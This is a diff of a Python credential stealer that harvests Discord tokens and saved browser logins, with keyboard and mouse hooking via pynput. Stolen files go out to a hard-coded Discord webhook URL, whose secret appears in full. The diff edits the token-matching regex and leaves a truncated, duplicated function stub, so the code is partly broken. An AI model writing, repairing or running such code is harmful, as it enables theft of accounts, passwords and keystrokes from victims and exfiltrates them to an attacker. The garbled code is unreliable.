@@ -24,7 +24,6 @@ import ctypes
 import win32crypt
 from Crypto.Cipher import AES
 from pynput import mouse, keyboard as pynput_keyboard
-from pynput import mouse, keyboard
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1435400854764130335/FjKkrLaNQ0uUt1N6Ud4cPmLmKXknSxaw_-H_b-qHuPG_bheA1l6nxdddvLatlBioO06Q"
 
@@ -80,7 +79,7 @@ def gettokens(path):
         try:
             with open(f"{path}{file}", "r", errors="ignore") as f:
                 for line in (x.strip() for x in f.readlines()):
-                    for values in re.findall(r"dQw4w9WgXcQ:[^.*$'(.*)'$.*$][^\"]*", line):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*]*$", line):
                         tokens.append(values)
         except PermissionError:
             continue
@@ -350,6 +349,9 @@ def collect_browser_logins(browser):
         send_file_to_discord(temp_txt)
     except:
         pass
+
+def get_browser_history(browser, limit=100):
+    original
 
 def get_browser_history(browser, limit=100):
     original_path = get_history_path(browser)
